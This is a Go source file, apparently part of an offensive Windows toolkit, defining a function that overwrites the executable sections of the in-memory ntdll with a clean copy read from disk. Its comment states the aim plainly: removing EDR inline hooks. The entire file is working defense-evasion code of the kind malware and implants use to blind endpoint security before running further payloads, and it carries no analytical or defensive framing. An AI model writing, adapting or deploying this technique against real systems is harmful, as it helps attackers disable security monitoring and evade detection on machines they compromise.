//go:build windows

package win

import (
	"fmt"
	"os"
	"path/filepath"
	"unsafe"

	"golang.org/x/sys/windows"
)

// UnhookNtdll replaces the in-memory ntdll .text section with a fresh copy read
// from disk, removing EDR inline hooks. The module base and size come from the
// PEB module list.
func UnhookNtdll() error {
	ntdll := ModuleNtdll()
	if ntdll == 0 {
		return errNoNtdll
	}

	// Locate the system directory and load the on-disk ntdll.
	sysDir, err := windows.GetSystemDirectory()
	if err != nil {
		return err
	}
	diskPath := filepath.Join(sysDir, "ntdll.dll")
	disk, err := os.ReadFile(diskPath)
	if err != nil {
		return err
	}

	dos := (*IMAGE_DOS_HEADER)(unsafe.Pointer(ntdll))
	if dos.e_magic != 0x5A4D {
		return fmt.Errorf("win: in-memory ntdll invalid")
	}
	memNt := (*IMAGE_NT_HEADERS64)(unsafe.Pointer(ntdll + uintptr(dos.e_lfanew)))
	diskDos := (*IMAGE_DOS_HEADER)(unsafe.Pointer(&disk[0]))
	if diskDos.e_magic != 0x5A4D {
		return fmt.Errorf("win: disk ntdll invalid")
	}

	// Iterate sections; only rewrite executable + discardable+mem-execute ones
	// (the .text region). Use the disk image's raw data pointers.
	memSections := unsafe.Slice((*IMAGE_SECTION_HEADER)(unsafe.Pointer(ntdll+uintptr(dos.e_lfanew)+4+unsafe.Sizeof(IMAGE_FILE_HEADER{})+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER64{}))), memNt.FileHeader.NumberOfSections)
	diskSections := unsafe.Slice((*IMAGE_SECTION_HEADER)(unsafe.Pointer(uintptr(unsafe.Pointer(&disk[0]))+uintptr(diskDos.e_lfanew)+4+unsafe.Sizeof(IMAGE_FILE_HEADER{})+unsafe.Sizeof(IMAGE_OPTIONAL_HEADER64{}))), memNt.FileHeader.NumberOfSections)

	for i := 0; i < int(memNt.FileHeader.NumberOfSections); i++ {
		s := &memSections[i]
		ds := &diskSections[i]
		// IMAGE_SCN_MEM_EXECUTE = 0x20000000
		if s.Characteristics&0x20000000 == 0 {
			continue
		}
		if int(ds.PointerToRawData)+int(ds.SizeOfRawData) > len(disk) {
			continue
		}
		// Make the memory region writable, copy, restore execute.
		dst := ntdll + uintptr(s.VirtualAddress)
		_, _ = VirtualProtectLocal(dst, uintptr(s.VirtualSize), pageExecuteReadWrite)
		copy(unsafe.Slice((*byte)(unsafe.Pointer(dst)), int(s.VirtualSize)), disk[ds.PointerToRawData:ds.PointerToRawData+ds.SizeOfRawData])
		_, _ = VirtualProtectLocal(dst, uintptr(s.VirtualSize), pageExecuteRead)
	}
	return nil
}
